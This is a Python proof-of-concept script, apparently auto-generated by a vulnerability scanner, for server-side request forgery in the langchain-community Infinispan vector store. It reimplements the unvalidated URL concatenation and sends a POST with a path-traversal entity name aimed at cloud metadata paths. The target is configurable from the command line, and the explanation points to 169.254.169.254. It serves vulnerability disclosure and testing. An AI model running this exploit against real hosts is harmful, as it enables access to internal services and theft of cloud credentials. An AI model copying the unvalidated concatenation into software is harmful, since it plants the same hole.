#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: ssrf-014
# Sink: schema_post
# Auto-generated — run with: python3 ssrf_url_concatenating_self_schema_post.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF in langchain-community Infinispan vector store.

Vulnerability: The `schema_post` method constructs a URL by concatenating
`self._default_node`, `self._schema_url`, and the `name` parameter without
validation. Both `self._default_node` (from `url`/`index_url`) and `name`
(from `entity_name`) can be attacker-controlled. This allows SSRF to internal
services or cloud metadata endpoints.

Exploit: We simulate an attacker controlling the `index_url` and `entity_name`
parameters to redirect the HTTP request to an internal service (e.g., cloud
metadata endpoint). The PoC uses a benign localhost target for safety.
"""

import requests
import sys
from typing import Optional

# =============================================================================
# CONFIGURATION - Change these to test against different targets
# =============================================================================

# The base URL for the Infinispan server (attacker-controlled `index_url`)
# In a real attack, this could point to an attacker's server or internal host.
TARGET_BASE_URL = "http://127.0.0.1:8080"  # Safe default - localhost

# The entity name to inject (attacker-controlled `entity_name`)
# This gets appended to the URL path. We use a path traversal to reach
# a different endpoint (e.g., cloud metadata or internal service).
# For safety, we target a harmless local path.
INJECTED_ENTITY_NAME = "../../../latest/meta-data/"

# The schema URL suffix (hardcoded in the library)
SCHEMA_URL_SUFFIX = "/rest/v2/schemas"

# Timeout for HTTP requests
REQUEST_TIMEOUT = 5

# =============================================================================
# SIMULATED VULNERABLE CLASS (simplified from langchain_community source)
# =============================================================================

class InfinispanVulnerable:
    """
    Simplified reproduction of the vulnerable Infinispan helper class.
    This mimics the exact URL construction logic from the library.
    """
    
    def __init__(self, url: str, entity_name: str):
        """
        Initialize with attacker-controlled parameters.
        
        Args:
            url: The base URL (attacker-controlled via `index_url`)
            entity_name: The entity name (attacker-controlled via `entity_name`)
        """
        self._default_node = url.rstrip("/")
        self._schema_url = SCHEMA_URL_SUFFIX
        self._entity_name = entity_name
    
    def schema_post(self, name: str, proto: str) -> requests.Response:
        """
        Vulnerable sink: constructs URL via string concatenation without validation.
        
        Args:
            name: Schema name (includes attacker-controlled entity_name)
            proto: Protobuf content
        
        Returns:
            HTTP response
        """
        # THIS IS THE VULNERABLE LINE - no validation of components
        api_url = self._default_node + self._schema_url + "/" + name
        
        print(f"[*] Constructed URL: {api_url}")
        print(f"[*] Sending POST request with proto content...")
        
        # requests follows redirects by default (SSRF amplification)
        response = requests.post(
            api_url,
            data=proto,
            timeout=REQUEST_TIMEOUT,
            allow_redirects=True  # Default, but explicit for clarity
        )
        return response
    
    def schema_create(self, proto: str) -> requests.Response:
        """
        Calls schema_post with attacker-controlled entity_name.
        This is the exact pattern from the library.
        """
        # The entity_name is directly concatenated: self._entity_name + ".proto"
        return self.schema_post(self._entity_name + ".proto", proto)


# =============================================================================
# EXPLOIT DEMONSTRATION
# =============================================================================

def demonstrate_ssrf(target_url: str, injected_name: str) -> None:
    """
    Demonstrate the SSRF vulnerability by making a request with
    attacker-controlled URL components.
    
    Args:
        target_url: The base URL to target (attacker-controlled)
        injected_name: The entity name with path traversal (attacker-controlled)
    """
    print("=" * 60)
    print("SSRF Proof-of-Concept for langchain-community Infinispan")
    print("=" * 60)
    print(f"\n[*] Target base URL: {target_url}")
    print(f"[*] Injected entity name: {injected_name}")
    print(f"[*] Expected final URL: {target_url}{SCHEMA_URL_SUFFIX}/{injected_name}.proto")
    print()
    
    # Create the vulnerable instance with attacker-controlled parameters
    vulnerable = InfinispanVulnerable(
        url=target_url,
        entity_name=injected_name
    )
    
    # Benign protobuf content (just a placeholder)
    benign_proto = 'syntax = "proto3";\nmessage Test { string data = 1; }'
    
    try:
        # Trigger the vulnerability
        response = vulnerable.schema_create(benign_proto)
        
        print(f"\n[*] Response status code: {response.status_code}")
        print(f"[*] Response headers: {dict(response.headers)}")
        print(f"[*] Response body (first 500 chars): {response.text[:500]}")
        
        # Check if we got a response (even an error indicates the request was made)
        if response.status_code < 500:
            print("\n[!] SUCCESS: The request reached the target URL!")
            print("[!] This demonstrates SSRF capability.")
            if "meta-data" in response.text.lower():
                print("[!] Detected cloud metadata response!")
        else:
            print("\n[*] Server error - expected if target is not a real service.")
            print("[*] The SSRF still occurred (request was sent to attacker-controlled URL).")
            
    except requests.exceptions.ConnectionError as e:
        print(f"\n[!] Connection error: {e}")
        print("[!] This is expected if the target host is not reachable.")
        print("[!] In a real attack, the request would reach the internal service.")
    except requests.exceptions.Timeout:
        print("\n[!] Request timed out - target may be firewalled or slow.")
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")


def main():
    """Main entry point with configurable target."""
    
    # Allow command-line override for testing different targets
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = TARGET_BASE_URL
    
    if len(sys.argv) > 2:
        injected = sys.argv[2]
    else:
        injected = INJECTED_ENTITY_NAME
    
    demonstrate_ssrf(target, injected)
    
    print("\n" + "=" * 60)
    print("EXPLANATION:")
    print("=" * 60)
    print("""
The vulnerability works because:
1. The `schema_post` method constructs a URL by simple concatenation:
   `api_url = self._default_node + self._schema_url + '/' + name`
2. Both `self._default_node` (from `index_url`) and `name` (from `entity_name`)
   are attacker-controlled with NO validation.
3. By injecting path traversal sequences (e.g., `../../../`) in `entity_name`,
   an attacker can redirect the request to arbitrary paths on the target host.
4. By controlling `index_url`, an attacker can point to any internal host
   (e.g., cloud metadata service at 169.254.169.254).
5. The `requests` library follows redirects by default, enabling further SSRF
   amplification.

SAFETY NOTE: This PoC uses localhost (127.0.0.1) as the target by default.
To test against a real internal service, change TARGET_BASE_URL or pass
it as a command-line argument.
""")


if __name__ == "__main__":
    main()
